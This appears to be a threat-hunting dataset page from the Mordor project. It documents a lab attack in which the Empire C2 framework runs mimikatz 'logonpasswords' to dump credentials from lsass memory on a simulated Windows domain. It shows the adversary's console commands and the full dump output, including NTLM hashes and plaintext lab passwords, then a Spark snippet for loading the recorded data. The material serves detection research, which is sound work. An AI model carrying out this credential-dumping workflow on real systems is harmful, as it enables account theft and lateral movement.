# Empire Mimikatz Logonpasswords

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-190518202151 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2019/05/18 |
| platform              | Windows |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | [] |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_logonpasswords.zip |
| References        | None |

## Dataset Description
This dataset represents adversaries using mimikatz and module `logonpasswords` to dump credentials from the memory contents of lsass.exe

## Adversary View
```
(Empire: agents) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
62HY9XCK ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         3172   5/0.0    2020-08-07 14:30:45  http            
B7Y8G4XC ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         1648   5/0.0    2020-08-07 14:31:46  http            

(Empire: agents) > interact B7Y8G4XC
(Empire: B7Y8G4XC) > 
(Empire: B7Y8G4XC) > usemodule credentials/mimikatz/logonpasswords*
(Empire: powershell/credentials/mimikatz/logonpasswords) > info

              Name: Invoke-Mimikatz DumpCreds
            Module: powershell/credentials/mimikatz/logonpasswords
        NeedsAdmin: True
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to extract
  plaintext credentials from memory.

Comments:
  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        B7Y8G4XC                  Agent to run module on.                 

(Empire: powershell/credentials/mimikatz/logonpasswords) > execute
[*] Tasked B7Y8G4XC to run TASK_CMD_JOB
[*] Agent B7Y8G4XC tasked with task ID 1
[*] Tasked agent B7Y8G4XC to run module powershell/credentials/mimikatz/logonpasswords
(Empire: powershell/credentials/mimikatz/logonpasswords) > 
Job started: FH5UKE

Hostname: WORKSTATION5.theshire.local / S-1-5-21-1363495622-3806888128-621328882

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  4 2020 20:16:54
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 2868007 (00000000:002bc327)
Session           : RemoteInteractive from 2
User Name         : pgustavo
Domain            : THESHIRE
Logon Server      : MORDORDC
Logon Time        : 8/5/2020 9:46:24 PM
SID               : S-1-5-21-1363495622-3806888128-621328882-1104
        msv :
        [00000003] Primary
        * Username : pgustavo
        * Domain   : THESHIRE
        * NTLM     : 81d310fa34e6a56a31145445891bb7b8
        * SHA1     : 2a953d745ed80427e309d957d20b0eeca3cd3d69
        * DPAPI    : be8815c8ec59ddeda43d2301dbc29c2c
        tspkg :
        wdigest :
        * Username : pgustavo
        * Domain   : THESHIRE
        * Password : W1n1!2019
        kerberos :
        * Username : pgustavo
        * Domain   : THESHIRE.LOCAL
        * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2860578 (00000000:002ba622)
Session           : RemoteInteractive from 2
User Name         : pgustavo
Domain            : THESHIRE
Logon Server      : MORDORDC
Logon Time        : 8/5/2020 9:46:24 PM
SID               : S-1-5-21-1363495622-3806888128-621328882-1104
        msv :
        [00000003] Primary
        * Username : pgustavo
        * Domain   : THESHIRE
        * NTLM     : 81d310fa34e6a56a31145445891bb7b8
        * SHA1     : 2a953d745ed80427e309d957d20b0eeca3cd3d69
        * DPAPI    : be8815c8ec59ddeda43d2301dbc29c2c
        tspkg :
        wdigest :
        * Username : pgustavo
        * Domain   : THESHIRE
        * Password : W1n1!2019
        kerberos :
        * Username : pgustavo
        * Domain   : THESHIRE.LOCAL
        * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2778269 (00000000:002a649d)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/5/2020 9:46:21 PM
SID               : S-1-5-90-0-2
        msv :
        [00000003] Primary
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b
        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7
        tspkg :
        wdigest :
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        kerberos :
        * Username : WORKSTATION5$
        * Domain   : theshire.local
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2776485 (00000000:002a5da5)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/5/2020 9:46:21 PM
SID               : S-1-5-90-0-2
        msv :
        [00000003] Primary
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b
        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7
        tspkg :
        wdigest :
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        kerberos :
        * Username : WORKSTATION5$
        * Domain   : theshire.local
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2771168 (00000000:002a48e0)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/5/2020 9:46:20 PM
SID               : S-1-5-96-0-2
        msv :
        [00000003] Primary
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b
        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7
        tspkg :
        wdigest :
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        kerberos :
        * Username : WORKSTATION5$
        * Domain   : theshire.local
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 8/5/2020 9:26:08 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
        * Username : (null)
        * Domain   : (null)
        * Password : (null)
        kerberos :
        * Username : (null)
        * Domain   : (null)
        * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 56937 (00000000:0000de69)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/5/2020 9:26:08 PM
SID               : S-1-5-90-0-1
        msv :
        [00000003] Primary
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b
        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7
        tspkg :
        wdigest :
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        kerberos :
        * Username : WORKSTATION5$
        * Domain   : theshire.local
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 56865 (00000000:0000de21)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/5/2020 9:26:08 PM
SID               : S-1-5-90-0-1
        msv :
        [00000003] Primary
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b
        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7
        tspkg :
        wdigest :
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        kerberos :
        * Username : WORKSTATION5$
        * Domain   : theshire.local
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WORKSTATION5$
Domain            : THESHIRE
Logon Server      : (null)
Logon Time        : 8/5/2020 9:26:07 PM
SID               : S-1-5-20
        msv :
        [00000003] Primary
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b
        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7
        tspkg :
        wdigest :
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        kerberos :
        * Username : workstation5$
        * Domain   : THESHIRE.LOCAL
        * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 33194 (00000000:000081aa)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/5/2020 9:26:07 PM
SID               : S-1-5-96-0-0
        msv :
        [00000003] Primary
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b
        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7
        tspkg :
        wdigest :
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        kerberos :
        * Username : WORKSTATION5$
        * Domain   : theshire.local
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 33086 (00000000:0000813e)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/5/2020 9:26:07 PM
SID               : S-1-5-96-0-1
        msv :
        [00000003] Primary
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b
        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7
        tspkg :
        wdigest :
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        kerberos :
        * Username : WORKSTATION5$
        * Domain   : theshire.local
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 31553 (00000000:00007b41)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 8/5/2020 9:26:07 PM
SID               : 
        msv :
        [00000003] Primary
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * NTLM     : 57ac24b9ba3b6f79dda7f900c75f467b
        * SHA1     : 8e553476906ead53af282b88aae47d9a6593e9f7
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WORKSTATION5$
Domain            : THESHIRE
Logon Server      : (null)
Logon Time        : 8/5/2020 9:26:06 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
        * Username : WORKSTATION5$
        * Domain   : THESHIRE
        * Password : "\TOW)%Li-i'd(En7Y*9%gD?Db90nd1:Xkg&ftIvG2=:+^9l4*'K!X51y1_.I0Yi;z<+:$"qJMD1V]Bo]+DFnghOJsCJ6bV7BUNMIe[]>r^9n;$4]IsA'na8
        kerberos :
        * Username : workstation5$
        * Domain   : THESHIRE.LOCAL
        * Password : (null)
        ssp :
        credman :
        cloudap :

mimikatz(powershell) # exit
Bye!

(Empire: powershell/credentials/mimikatz/logonpasswords) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_logonpasswords.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        